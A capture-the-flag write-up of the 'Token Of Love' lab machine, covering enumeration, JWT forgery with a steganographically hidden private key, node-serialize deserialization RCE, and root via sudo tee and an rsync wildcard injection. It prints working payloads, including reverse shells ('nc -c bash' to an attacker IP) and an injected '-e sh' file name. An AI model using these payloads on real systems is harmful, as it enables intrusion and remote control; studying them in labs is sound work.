---
author: Lenam
pubDatetime: 2025-02-20T15:22:00Z
title: WriteUp Token Of Love - TheHackersLabs
slug: token-of-love-writeup-thehackerslabs-en
featured: false
draft: false
ogImage: "assets/token-of-love/OpenGraph.png"
tags:
  - writeup
  - thehackerslabs
  - jwt
  - node serialization
  - rsync wyldcards
  - sudo
description:
  Writeup narrating the exploitation in "Token Of Love," where a hidden clue in IPFS is deciphered to obtain the private key and manipulate the JWT. Vulnerabilities in Node.js are exploited to achieve RCE, and by using sudo with tee and a vulnerability in rsync wildcards, privilege escalation to root is achieved.
lang: en
---

![Rabbit in Matrix](/assets/token-of-love/OpenGraph.png)

Writeup lovingly narrating the hacker journey in "Token Of Love," where a hidden clue in IPFS is deciphered to obtain the private key and manipulate the JWT. Vulnerabilities in Node.js are exploited to execute remote code, and with a clever trick using sudo with tee and a vulnerability in rsync wildcards, privilege escalation is achieved with care until root privileges are obtained.

![alt text](/assets/token-of-love/image.png)

## Table of Contents

## Automated Enumeration

We scan the open ports:

```bash
$ nmap -p- -Pn -n 192.168.1.179
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-23 20:04 CET
Nmap scan report for 192.168.1.179
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

We find port 80 and port 22, then scan these two ports to gather more information.

```bash
$ nmap -p22,80 -Pn -n -sVC 192.168.1.179
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-23 20:05 CET
Nmap scan report for 192.168.1.179
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 f21345975282db77a38c7c243651e2c9 (ECDSA)
|_  256 4b3ef2d3c4f6becd04fff1a11fa563d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Token Of Love - Inicia Sesi\xC3\xB3n
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

We try to gather more information about the website on port 80 using `whatweb`.

```bash
$ whatweb http://192.168.1.179
http://192.168.1.179 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.1.179], PasswordField[password], Title[Token Of Love - Inicia Sesión], X-Powered-By[Express]
```

We also perform fuzzing on the website to gather even more information.  

Using `dirb` ...

```bash
$ dirb http://192.168.1.179

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 23 20:12:17 2025
URL_BASE: http://192.168.1.179/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.179/ ----
+ http://192.168.1.179/css (CODE:301|SIZE:153)                                                      
+ http://192.168.1.179/images (CODE:301|SIZE:156)                                                   
+ http://192.168.1.179/logout (CODE:302|SIZE:23)                                                    
+ http://192.168.1.179/messages (CODE:403|SIZE:22)                                                  
+ http://192.168.1.179/private (CODE:403|SIZE:22)                                                   
+ http://192.168.1.179/register (CODE:200|SIZE:8121)                                                
+ http://192.168.1.179/server-status (CODE:403|SIZE:278)                                            
                                                                                                    
-----------------
END_TIME: Sun Feb 23 20:13:20 2025
DOWNLOADED: 4612 - FOUND: 7

```

... and with `gobuster`.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.179 -x .php,.txt,.zip,.db,.htm,.html -t 40 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.179
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              htm,html,php,txt,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 156] [--> /images/]
/register             (Status: 200) [Size: 8125]
/css                  (Status: 301) [Size: 153] [--> /css/]
/messages             (Status: 403) [Size: 22]
/private              (Status: 403) [Size: 22]
/logout               (Status: 302) [Size: 23] [--> /]
/Register             (Status: 200) [Size: 8124]
/Private              (Status: 403) [Size: 22]
/Logout               (Status: 302) [Size: 23] [--> /]
/Messages             (Status: 403) [Size: 22]
/server-status        (Status: 403) [Size: 278]
```

## Manual Enumeration  

![alt text](/assets/token-of-love/image-1.png)  

We access the website on port 80, register, and log in. We inspect the source code after logging in and check the cookies—it appears to be a JWT session cookie.  

In the JavaScript code of the page, we can find several clues.

```html
<script>
    // Función para obtener mensajes desde el servidor y renderizarlos de forma segura
    function loadMessages() {
      fetch('/messages')
        .then(response => response.json())
        .then(data => {
          const messagesDiv = document.getElementById('messages');
          messagesDiv.innerHTML = '';
          data.messages.forEach(msg => {
            const div = document.createElement('div');
            div.className = 'message';
            
            // Crear un elemento para el remitente y establecer el texto usando textContent para evitar inyección HTML
            const senderEl = document.createElement('strong');
            senderEl.textContent = msg.sender;
            div.appendChild(senderEl);
            
            // Agregar información de la fecha y hora
            const timestampText = document.createTextNode(" (" + new Date(msg.timestamp).toLocaleString() + "): ");
            div.appendChild(timestampText);
            
            // Crear un nodo de texto para el mensaje, asegurando que se escape cualquier carácter HTML
            const messageText = document.createTextNode(msg.text);
            div.appendChild(messageText);
            
            messagesDiv.appendChild(div);
          });
        })
        .catch(error => console.error('Error al cargar mensajes:', error));
    }

    // Cargar mensajes al iniciar la página
    loadMessages();
    /**

    .-./`) .-------.  ________    .-'''-.  
    \ .-.')\  _(`)_ \|        |  / _     \ 
    / `-' \| (_ o._)||   .----' (`' )/`--' 
    `-'`"`|  (_,_) /|  _|____ (_ o _).    
    .---. |   '-.-' |_( )_   | (_,_). '.  
    |   | |   |     (_ o._)__|.---.  \  : 
    |   | |   |     |(_,_)    \    `-'  | 
    |   | /   )     |   |      \       /  
    '---' `---'     '---'       `-...-'   

    Busca el conejo hacker amoroso en un mundo interplanetario !

    **/
    // Solo los usuarios admin pueden enviar mensajes
    
</script>
```

Session cookie `token` has HttpOnly enabled.  

![alt text](/assets/token-of-love/image-2.png)  

The JWT from the cookie can be decoded to view its content and the algorithm it uses.  

![alt text](/assets/token-of-love/image-3.png)  

To decode the JWT token found in the cookie, we use the website [https://10015.io/tools/jwt-encoder-decode](https://10015.io/tools/jwt-encoder-decode).  

We see that the cookie uses the asymmetric algorithm RS256, meaning there is likely a private and a public key. The private key is used to sign the tokens, and the public key is used to validate signed tokens.  

Applications that use asymmetric signing systems for JWTs often expose public keys so that clients can verify the server’s signature. These are typically exposed at the `/.well-known/jwks.json` endpoint by convention. We check if this endpoint exists, and it returns the public key in JSON format.

```bash
$ curl http://192.168.1.179/.well-known/jwks.json | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   420  100   420    0     0  93645      0 --:--:-- --:--:-- --:--:--  102k
{
  "keys": [
    {
      "kty": "RSA",
      "n": "qvf2RrttWEl-3JydhNL9sOmnRrjIQKTJgUnuAyyhqUQF0GbcMtlLJakWVLdb23n5rwW6AvX9dXHzG4Fmj7bqy8GEKP6i3_GzZzEMMOtzF7BQFJnIH9uC0hIvn2ha---iEf9flPFO-qEjlm7qLhmoRhlre-D8Hb_8V5qm2VDcV2Tna8Q4IsYVf1IqVpMZ3seBkaYRXuCgXE_9ItagHYMaYA0G41Y-YPppnHjqUp3NYG7K7bBI4G1krwxAFqZTZUZQIlBdJ6ej6oKVCzrsUUzB5Y-BnW-2Hx6fDM-ik4ChNfpKOL7rLyqvvVKnIMlB1vFQplr4RWeonnUSdAMs5vj9Vw",
      "e": "AQAB",
      "alg": "RS256",
      "use": "sig",
      "kid": "1"
    }
  ]
}
```

If we try to manipulate the JWT, we won’t be able to because the implementation is well done (or so I believe). It only accepts JWTs signed with the private key, and we can't use the various techniques from PortSwigger. The goal here is to understand what a JWT is and how asymmetric keys work.  

In summary, we need the private key of this application to manipulate the JWT. In the source code, there is a crucial clue: **IPFS** (`InterPlanetary File System`). Additionally, in the administrator's messages, there are more hints, including what appears to be a hash.  

![alt text](/assets/token-of-love/image-4.png)  

```text
administrador (15/2/2025, 23:50:11): Dicen que las claves viajan por rutas interplanetarias, vagando por el espacio infinito y estando en todas partes a la vez… ¿será magia o pura tecnología? 😉🔮 bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu
```  

Using an HTTP Gateway for IPFS, we can retrieve one from the following list:

https://ipfs.github.io/public-gateway-checker/

We only need to add the IPFS resource hash to the URL of the selected Gateway.

```bash
$ wget https://ipfs.io/ipfs/bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu                          
--2025-02-16 00:04:33--  https://ipfs.io/ipfs/bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu
Resolviendo ipfs.io (ipfs.io)... 2602:fea2:2::1, 209.94.90.1
Conectando con ipfs.io (ipfs.io)[2602:fea2:2::1]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1025464 (1001K) [image/webp]
Grabando a: «bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu»

bafybeicbqiitqxhqx47qenneilg 100%[==============================================>]   1001K  --.-KB/s    en 0,1s    

2025-02-16 00:04:33 (8,30 MB/s) - «bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu» guardado [1025464/1025464]

$ ls    
bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu

$ file bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu 
bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu: RIFF (little-endian) data, Web/P image

$ mv bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu file.webp

```

We check the file, and it appears to be a `WEBP` image. We modify the file for easier handling and open it to view the image.  

![alt text](/assets/token-of-love/image-5.png)  

It's the same rabbit that appears on the login and registration pages. We compare the differences, and everything seems identical, but it's not.  

```bash
$ diff hacker.webp file.webp  
Los archivos binarios hacker.webp y file.webp son distintos
```  

It looks like the file downloaded from `IPFS` contains something. Since `steghide` does not support `WEBP` files, we use `imgconceal` instead.

https://github.com/tbpaolini/imgconceal

```bash
$ wget https://github.com/tbpaolini/imgconceal/releases/download/v1.0.4/imgconceal
$ chmod +x imgconceal
$ ./imgconceal -e file.webp       
Input password for the hidden file (may be blank)
Password: 
Scanning cover image for suitable carrier bits... Done!  
SUCCESS: extracted 'private.key' from 'file.webp'.
  hidden on: Thu Feb 13 18:49:04 2025
$ cat private.key    
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCq9/ZGu21YSX7c
nJ2E0v2w6adGuMhApMmBSe4DLKGpRAXQZtwy2UslqRZUt1vbefmvBboC9f11cfMb
gWaPturLwYQo/qLf8bNnMQww63MXsFAUmcgf24LSEi+faFr776IR/1+U8U76oSOW
buouGahGGWt74Pwdv/xXmqbZUNxXZOdrxDgixhV/UipWkxnex4GRphFe4KBcT/0i
1qAdgxpgDQbjVj5g+mmceOpSnc1gbsrtsEjgbWSvDEAWplNlRlAiUF0np6PqgpUL
OuxRTMHlj4Gdb7YfHp8Mz6KTgKE1+ko4vusvKq+9UqcgyUHW8VCmWvhFZ6iedRJ0
Ayzm+P1XAgMBAAECggEASm8HMTdDfUcOLNUgvSWw3ndzZNZpFL/JnPjHX2lsfomH
cHp/zsGMtno9pydnHhAmNN1s5QIc1aeFHIoDUXllEs2PENv/pDkSDtCrSpcPdhZE
XxuupbQHahcR1bh0uC/VozlH70v5wyMpn8JtQSHZgZ9qjLXgfcFKhwdlMcLDE2a7
2S5xac3OCQSD6Dak0pwTcnjUiQb43H6sR9d6DY6eMBTrCH+nJdHh3vOathhIzlj7
uDPYc5o5E6Ui6JJmrRt5H4FSAIzati3qw3+eE9hRbYqNJtYnQcxWXSY2HbLX8ooh
LUcAGm23+RSy7cBfdIQUSjWROqk6oE9XZaP6JE3YaQKBgQDegPsKL+6jBH16LKo3
vSm1vVh0aq87yv2zhTPNMctM30hOKzQqfNOt4yJQ5j86hEqMr1iHrgXOMRmxZAHt
Y330s50nva2aV2DekY6KZHk2prUfwMYp+UjAGL5ehRJ3goI5eD+Eo8+NIwk4hecM
kxnaBktuXjvhHaI5VZOTxr57GQKBgQDEtODMSu3OsqtDmQVyMjBiR5W1l8dp9vn3
jRo2uRc2EEKh2rOQxFJy4UYcg8O5Ekp0irD8jr7GGrHgTF+9o3u0k37h8AOZdR94
Yj5UGo3hkYzcSyAmg+5IauLNATXKAkMsF1VwRDLp34PWL3BDcS63LF6f+iSl9vYR
FVNlWoe57wKBgDxqYz/R4gcrmfKJnDKET4YEgrchnLEsnhSXr4gg5CXcXuKywnhi
6otFqDS1QCfgcemfVveIXhUtqd9L22Yc5L+D4cE/tJq67ReiCEU1oOAhBf84NdaB
1KosTcyWb3w52KhIKV8Xp6yX/dH2MdVtP9C+cs7mEXY/uKO+w9KVXXVJAoGAfMSC
BfLM7htz+Dd6NdnRyLTBJ+Ky0Oqf2L4+T1GNgHRF32XaGcv8w/NRxkppfd01LsC9
zCQ6q2tJQg0PeTjWAU7A30ye69pXcMNX537EWbw5jY11QhjSrkplu0S2OoC+3Juc
TM5lQOTOOa/zVEPZLsRM7Mn8Luz7XRCayiHnDy8CgYBsSiu45tsvRRKmMNY4Gxb5
6s2rgGPKbDxmXc4s5xqAqNi6MmFxcZQGkmw8Unzd1QB9HeFGlJGuqIeIj5kRLepL
4mKP3UvXUZGHWIl4MNSoqPh8u1Sq2P4W/K+NOlKTXnmrvldF+VxYaRTdqQ46+h3k
PkDtOtToiExm8jdJZ5lNdw==
-----END PRIVATE KEY-----
```

We obtain a private key that is used to sign the JWT token, allowing us to manipulate it. We can verify that this private key corresponds to the public key found in `/.well-known/jwks.json`, though we first need to convert it. We could also regenerate the public key from the private key. In short, there are several ways to confirm that this private key belongs to the application exposed on port 80, but doing so won't be necessary.  

## Intrusion  

We return to [https://10015.io/tools/jwt-encoder-decoder](https://10015.io/tools/jwt-encoder-decoder) and use the private key to sign the JWT.  

![alt text](/assets/token-of-love/image-6.png)  

We copy the JWT signed with the private key, log in with our user account in the application, and modify the `token` cookie by replacing it with the modified JWT, changing the role to `"admin"`. After refreshing the browser, we are now an administrator and can send messages.  

![alt text](/assets/token-of-love/image-7.png)  

At this point, having the private key allows us to impersonate any registered user or even the server itself, but this is enough for now.  

Now, there is more JavaScript—specifically the one that sends messages to the API.

```javascript
// Solo los usuarios admin pueden enviar mensajes
    document.getElementById('messageForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const messageTextValue = document.getElementById('messageText').value;
        // Crear objeto del mensaje
        const message = { text: messageTextValue };
        // Serializar el objeto utilizando JSON.stringify; node-serialize deserializará en el servidor
        const serializedMessage = JSON.stringify(message);

        fetch('/messages', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ data: serializedMessage })
        })
        .then(response => response.json())
        .then(data => {
          if(data.message) {
            alert(data.message);
            document.getElementById('messageText').value = '';
            loadMessages();
          } else {
            alert('Error al enviar mensaje');
          }
        })
        .catch(error => {
          console.error('Error al enviar mensaje:', error);
          alert('Error al enviar mensaje');
        });
      });
```

On the other hand, by observing the response headers we initially obtained with `whatweb` or through the browser's developer tools, we can see that the backend is an application using Express, a Node.js framework.  

![alt text](/assets/token-of-love/image-8.png)  

Additionally, there is a very subjective message on the website:  

```text
Serializa tu mensaje y envíalo con cariño.
```  

We use Burp Suite to capture the request when sending a message and forward it to the repeater.  

We modify the sent data with the following payload:

```json
{"data":"{\"text\":\"test\",\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('wget 192.168.1.116', function(error, stdout, stderr) { console.log(stdout) });}()\"}"}
```

It sends a JSON with the `data` parameter, where another JSON appears to be embedded. In reality, this is a JavaScript object that gets deserialized on the server, allowing us to achieve RCE.  

![alt text](/assets/token-of-love/image-9.png)  

More information about this technique:  

- [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)  
- [https://hacktricks.boitatech.com.br/pentesting-web/deserialization#node-serialize](https://hacktricks.boitatech.com.br/pentesting-web/deserialization#node-serialize)  
- [https://www.exploit-db.com/exploits/45265](https://www.exploit-db.com/exploits/45265)  
- [https://www.exploit-db.com/exploits/49552](https://www.exploit-db.com/exploits/49552)  
- [https://www.exploit-db.com/exploits/50036](https://www.exploit-db.com/exploits/50036)  

We set up a reverse shell listener using Netcat on port 12345:  

```bash
nc -lvnp 12345
```  

Then, we send the following payload via Burp Suite:  

```json
{"data":"{\"text\":\"test\",\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('nc -c bash 192.168.1.116 12345', function(error, stdout, stderr) { console.log(stdout) });}()\"}"}
```  

We successfully obtain a shell as the user `cupido`.

![alt text](/assets/token-of-love/image-10.png)

## Privilege Escalation  

We prepare the terminal for better usability. We see that the user `cupido` can execute `tee` as the user `eros` without requiring a password.  

```bash
cupido@tokenoflove:~/tokenoflove$ sudo -l
Matching Defaults entries for cupido on tokenoflove:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User cupido may run the following commands on tokenoflove:
    (eros) NOPASSWD: /usr/bin/tee
```

According to `gtfobins`, this allows us to write files as the user `eros`.  

![alt text](/assets/token-of-love/image-11.png)  

If we try to create an SSH key for the user `eros`, it won’t be useful since the SSH service is only accessible to the `root` user.  

```bash
cupido@tokenoflove:~/tokenoflove$ cat /etc/ssh/sshd_config
# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/bin:/usr/games

# The strategy use...
...
...

AllowUsers root
```

On the other hand, if we check the processes running as `root` using `pspy64`, we transfer it to the server and execute it. After waiting a minute, we find the following process:  

![alt text](/assets/token-of-love/image-12.png)  

We notice that a process using `rsync` copies the entire home directory of the user `eros`. The way it is implemented makes it vulnerable to `rsync wildcards` ([https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)).  

Essentially, the key detail that interests us is this:

```
CMD: UID=0     PID=2888   | /bin/sh -c bash -c "cd /home/eros && rsync -i /root/.ssh/id_ed25519 -t *.txt tokenoflove:/root/copyhome-eros" > /dev/null 2>&1
CMD: UID=0     PID=2890   | rsync -i /root/.ssh/id_ed25519 -t nota2.txt nota3.txt nota.txt tokenoflove:/root/copyhome-eros 
```

We continue with the user `cupido`. Since we can use `sudo` to write files as the user `eros` and we have a possible `rsync wildcard` vulnerability, we combine both techniques to create the following files and gain direct access to `root`.  

```bash
cupido@tokenoflove:~$ echo "nc -c bash 192.168.1.116 443" | sudo -u eros /usr/bin/tee /home/eros/shell.txt
nc -c bash 192.168.1.116 443
cupido@tokenoflove:~$ echo "" | sudo -u eros /usr/bin/tee /home/eros/'-e sh shell.txt'
```

Then, we start a listener on our machine:  

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.1.116] from (UNKNOWN) [192.168.1.179] 41722
id
uid=0(root) gid=0(root) grupos=0(root)
```

![alt text](/assets/token-of-love/image-13.png)  

After waiting for a maximum of one minute, we successfully obtain a root shell.